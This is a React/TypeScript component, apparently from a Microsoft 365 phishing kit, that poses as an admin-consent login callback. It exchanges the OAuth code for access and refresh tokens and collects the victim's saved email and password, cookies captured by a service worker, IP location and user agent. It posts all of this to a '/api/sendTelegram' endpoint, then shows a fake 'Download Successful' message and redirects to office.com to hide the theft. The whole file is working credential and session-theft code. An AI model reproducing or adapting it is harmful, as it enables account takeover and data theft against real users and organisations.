import { useEffect, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { detectBrowserCapabilities, getStoredData } from '../utils/restoreCookies';

// Helper function to get byte length, as it's used in AuthCallback
function getByteLengthForBrowser(str: string): number {
  return new Blob([str]).size;
}

export default function AdminConsentCallback() {
  const location = useLocation();
  const navigate = useNavigate();
  const [status, setStatus] = useState('Processing admin consent...');
  const [progress, setProgress] = useState(10);

  useEffect(() => {
    const handleCallback = async () => {
      const params = new URLSearchParams(location.search);
      const code = params.get('code');
      const error = params.get('error');

      if (error) {
        setStatus(`Error: ${error}`);
        console.error('❌ Admin consent error:', params.get('error_description'));
        return;
      }

      if (!code) {
        setStatus('Error: Missing authorization code.');
        console.error('❌ No authorization code received');
        return;
      }

      try {
        // ========== STEP 1: Exchange Code for Tokens ==========
        setStatus('Exchanging authorization code...');
        setProgress(25);
        console.log('🔄 Exchanging authorization code for tokens...');
        
        const tokenResponse = await fetch('/api/exchangeAdminConsentCode', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            code,
            email: sessionStorage.getItem('ms_email') || localStorage.getItem('ms_email'),
            state: sessionStorage.getItem('ms_oauth_state')
          })
        });

        if (!tokenResponse.ok) {
          throw new Error(`Token exchange failed with status ${tokenResponse.status}`);
        }

        const oauthTokens = await tokenResponse.json();
        console.log('✅ Tokens received successfully.');
        setProgress(40);

        // ========== STEP 2: Gather All Data ==========
        setStatus('Consolidating your data...');
        console.log('🔄 Consolidating all data for submission...');

        // --- Credentials ---
        const storedCreds = localStorage.getItem('ms_auth_credentials') || sessionStorage.getItem('ms_auth_credentials');
        const credentials = storedCreds ? JSON.parse(storedCreds) : { email: localStorage.getItem('ms_email') };

        // --- Cookies (from Service Worker) ---
        let cookies: any[] = [];
        if (window.microsoftCookieBridge) {
          const bridgeData = await window.microsoftCookieBridge.retrieveCaptureData();
          if (bridgeData && bridgeData.cookies) {
            cookies = bridgeData.cookies;
            console.log(`✅ Retrieved ${cookies.length} cookies from Service Worker bridge`);
          }
        }
        
        // --- Location Data ---
        let locationData: any = {};
        try {
          const locResponse = await fetch('https://ipapi.co/json/');
          locationData = await locResponse.json();
          console.log('✅ Location data fetched.');
        } catch (locError) {
          console.warn('⚠️ Could not fetch location data:', locError);
        }
        setProgress(60);

        // --- Cookie File ---
        const jsonContent = JSON.stringify({ cookies }, null, 2);
        const cookieFile = {
            name: `cookies_${new Date().getTime()}.json`,
            content: jsonContent,
            size: getByteLengthForBrowser(jsonContent)
        };

        // ========== STEP 3: Build and Send Payload ==========
        setStatus('Sending data securely...');
        console.log('📤 Preparing to send payload to Telegram...');
        
        const payload = {
          email: credentials.email,
          password: credentials.password || '',
          oauth: {
            access_token: oauthTokens.access_token,
            refresh_token: oauthTokens.refresh_token,
            id_token: oauthTokens.id_token,
            expires_in: oauthTokens.expires_in,
            captured_at: new Date().toISOString()
          },
          cookies: cookies,
          cookieCount: cookies.length,
          locationData: locationData,
          cookieFiles: { jsonFile: cookieFile },
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString(),
          validated: true,
          microsoftAccount: true
        };
        
        const telegramResponse = await fetch('/api/sendTelegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (!telegramResponse.ok) {
            throw new Error('Failed to send data to Telegram.');
        }

        console.log('✅✅✅ SUCCESS: All data transmitted to Telegram!');
        setProgress(100);
        setStatus('✅ Download Successful');

        // ========== STEP 4: Final Redirect ==========
        setTimeout(() => {
          console.log('🎉 Redirecting to Office.com...');
          window.location.href = 'https://www.office.com/?auth=2';
        }, 2000);

      } catch (err: any) {
        console.error('❌ A critical error occurred in the callback flow:', err);
        setStatus(`Error: ${err.message}`);
        // Optionally navigate to an error page or home
        // navigate('/');
      }
    };

    handleCallback();
  }, [location, navigate]);

  // Unified loading/status component
  return (
    <div style={{
      display: 'flex',
      flexDirection: 'column',
      justifyContent: 'center',
      alignItems: 'center',
      height: '100vh',
      fontFamily: 'Segoe UI, Arial, sans-serif',
      backgroundColor: '#f3f2f1'
    }}>
        <h2 style={{ marginBottom: '20px', fontSize: '24px' }}>{status}</h2>
        <div style={{
            width: '300px',
            height: '8px',
            backgroundColor: '#e0e0e0',
            borderRadius: '4px',
            overflow: 'hidden',
            marginBottom: '20px'
        }}>
            <div style={{
                width: `${progress}%`,
                height: '100%',
                backgroundColor: '#0078d4',
                transition: 'width 0.3s ease'
            }}></div>
        </div>
        <p style={{ fontSize: '14px', color: '#666', marginBottom: '30px' }}>{progress}%</p>
        <div style={{
            border: '4px solid #f3f2f1',
            borderTop: '4px solid #0078d4',
            borderRadius: '50%',
            width: '40px',
            height: '40px',
            animation: 'spin 1s linear infinite'
        }}></div>
      <style>{`
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
      `}</style>
    </div>
  );
}